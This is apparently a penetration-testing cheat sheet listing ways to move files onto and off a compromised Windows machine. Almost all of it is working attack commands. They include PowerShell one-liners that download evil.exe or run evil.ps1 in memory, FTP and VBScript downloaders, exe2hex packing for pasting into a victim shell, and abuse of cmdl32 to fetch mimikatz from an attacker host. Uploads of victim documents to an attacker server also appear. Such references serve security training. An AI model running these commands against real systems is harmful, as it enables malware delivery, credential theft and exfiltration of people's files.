# File Transfers

## Download

### Powershell

```
# Simple one-liner
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/evil.exe', 'evil.exe')

# Execute powershell scripts without saving to disk
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.0.0.1/evil.ps1')
```

### FTP

Use of embedded ftp client. Add -s option to give a file containing FTP commands:

```
echo open 10.0.0.1 21> ftp.txt
echo USER test>> ftp.txt
echo pwd>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

Execute:

```
ftp -v -n -s:ftp.txt
```

Server (Linux):

```
python -m pyftpdlib -p 21
```

### TFTP

```
tftp <IP> GET <file>
```

Server (Kali):

```
systemctl start atftpd
```

### VBScript

Simple HTTP downloader script:

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >>
wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >>
wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Execute:

```
cscript wget.vbs http://10.0.0.1/evil.exe evil.exe
```

### Exe2hex

```
# Attacker
upx -9 evil.exe
exe2hex -x evil.exe -p evil.cmd

# Victim -> copy/paste the content of evil.cmd in a shell
```

### Cmdl32

```
icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
echo [Connection Manager] > settings.txt
echo CMSFile=settings.txt >> settings.txt
echo ServiceName=WindowsUpdate >> settings.txt
echo TunnelFile=settings.txt >> settings.txt
echo [Settings] >> settings.txt
echo UpdateUrl=http://attacker/mimikatz.exe >> settings.txt
cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
move <tmp_filename>.tmp mimikatz.exe
```

## Upload

### Powershell

```
powershell (New-Object System.Net.WebClient).UploadFile('http://10.0.0.1/upload.php', 'doc.docx')
```

### TFTP

```
tftp -i 10.11.0.4 put important.docx
```
